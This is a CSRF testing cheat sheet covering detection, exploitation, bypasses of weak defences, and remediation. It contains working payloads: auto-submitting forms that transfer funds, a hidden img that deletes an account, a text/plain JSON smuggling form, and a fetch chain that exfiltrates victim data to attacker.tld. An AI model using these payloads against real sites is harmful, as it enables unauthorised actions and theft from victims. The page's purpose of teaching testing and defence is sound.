# Cross-Site Request Forgery (CSRF)

> Victim's authenticated browser is tricked into issuing a state-changing request to a target site. Authorized testing only. Map: OWASP WSTG-SESS-05, CWE-352.

## TL;DR
- CSRF needs three ingredients: (1) state-changing endpoint, (2) cookie/header auto-sent by browser, (3) no anti-CSRF token / SameSite cookie / Origin check.
- `SameSite=Lax` (modern browser default since 2020) blocks most cross-site POST/GET — most "trivial CSRF" died with this change. But `SameSite=None`, `OPTIONS`-then-`POST` chains, subdomain-shared cookies, and CORS-credentialed XHR still produce CSRF in 2025.
- JSON-body endpoints aren't immune: `<form enctype="text/plain">` lets you send `{"x":"y"}`-shaped bodies cross-origin.
- Defence: anti-CSRF token (synchroniser pattern), `SameSite=Lax`/`Strict`, `Origin`/`Referer` validation, custom request header that requires a CORS preflight.

## Detection / Discovery
| Indicator | Check |
| --- | --- |
| Cookie `Set-Cookie: session=…; SameSite=None` (or missing SameSite, treated as `None` on pre-2020 browsers) | Cross-site cookie-bearer request possible. |
| State-changing GET (`/api/transfer?to=evil&amount=1000`) | Trivial CSRF via `<img>` / `<a href>` / redirect. |
| POST with `application/x-www-form-urlencoded` body and no token | Standard HTML form CSRF. |
| POST with `application/json` body, no `Origin` check | Try `Content-Type: text/plain` trick + `<form enctype="text/plain">`. |
| No `Origin`/`Referer` check on sensitive endpoints | Cross-site fetch with credentials. |

```bash
# Confirm endpoint is state-changing + no token required
curl -i -b 'session=<victim-cookie>' -d 'amount=1&to=attacker' https://target/api/transfer
# If 200 + side effect → CSRF candidate. Verify token requirement by sending without any custom header.
```

## Exploitation

### Classic HTML form POST (cross-origin)
```html
<!doctype html>
<html><body>
<form action="https://target/api/transfer" method="POST" id="f">
  <input name="to" value="attacker"/>
  <input name="amount" value="1000"/>
</form>
<script>document.getElementById('f').submit();</script>
</body></html>
```
Host on `attacker.tld`; trick victim into visiting. Cookies attached automatically if `SameSite=None` or missing on legacy browsers.

### GET-state-changing (broken by design but still common)
```html
<img src="https://target/api/delete-account?confirm=1" style="display:none">
```

### JSON endpoint without `Origin` check via `text/plain`
```html
<form action="https://target/api/transfer" method="POST" enctype="text/plain" id="f">
  <input name='{"to":"attacker","amount":1000,"x":' value='"y"}'>
</form>
<script>document.getElementById('f').submit();</script>
```
Bodies of form `application/x-www-form-urlencoded` are blocked by browsers as `text/plain` for some target servers, but if the server permissively parses the body as JSON (Spring `consumes=APPLICATION_JSON`), the payload reaches business logic.

### CORS-credentialed XHR
If the target sends `Access-Control-Allow-Origin: <attacker>` + `Access-Control-Allow-Credentials: true` (rare but happens through reflected-origin bugs), attacker-side JS can `fetch(url, {credentials:'include'})` and read the response — CSRF + data exfil.

```javascript
fetch('https://target/api/me', {credentials: 'include'})
  .then(r => r.text())
  .then(t => fetch('https://attacker.tld/x', {method:'POST', body: t}));
```

### Login CSRF
Force victim to log in as attacker → attacker reads victim's subsequent activity from their own account. Same techniques apply to `/login`.

## Bypasses (against weak defences)
- Token validated but **not bound to session** → reuse a token from your own session.
- Token validated only on `POST`, not on `PUT`/`DELETE`/`PATCH` — see [./http-verb-tampering.md](./http-verb-tampering.md).
- `Referer` checked with `startswith('https://target')` → use `https://target.attacker.com/`. Or check is `contains('target')` → `https://attacker.com/target/x`.
- `SameSite=Lax` cookie + GET-state-change → still works because Lax allows top-level GET.
- Subdomain-set cookie (`Domain=.target.com`) + XSS on `dev.target.com` → write to `target.com` cookie / read via the XSS context.

## Defence / Remediation
- **`SameSite=Lax`** (default for first-party session cookies); `Strict` for sensitive ones (admin panel, password change). Note: still allows top-level GET — so don't ship state-changing GETs.
- **Anti-CSRF token** (synchroniser-token pattern):
  - Per-session, cryptographically random.
  - Bound to user session in server-side store.
  - Required on every state-changing request (POST/PUT/PATCH/DELETE).
  - In header (`X-CSRF-Token`) or hidden form field; never in URL.
- **Origin / Referer check** as defence-in-depth (reject if mismatch with allow-list).
- **Custom request header** (`X-Requested-With: XMLHttpRequest`) — forces a CORS preflight for cross-origin requests; absence indicates classic HTML-form CSRF.
- **Re-authenticate** for highest-impact actions (password change, money transfer, account deletion). NIST SP 800-63B AAL2-3.
- **Use a framework that does this by default** — Django CSRF middleware, Rails `protect_from_forgery`, Spring Security `CsrfFilter`, Express + `csurf` (deprecated; use Lusca or built-in `csrf-csrf`).

## Sources
- OWASP WSTG-SESS-05 Testing for CSRF: https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/05-Testing_for_Cross_Site_Request_Forgery
- OWASP Cheat Sheet — Cross-Site Request Forgery Prevention: https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html
- PortSwigger — CSRF: https://portswigger.net/web-security/csrf
- PayloadsAllTheThings CSRF Injection: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Cross-Site%20Request%20Forgery
- MDN — SameSite cookies: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie/SameSite
- HackTricks CSRF: https://book.hacktricks.wiki/en/pentesting-web/csrf-cross-site-request-forgery.html
- CWE-352 Cross-Site Request Forgery: https://cwe.mitre.org/data/definitions/352.html
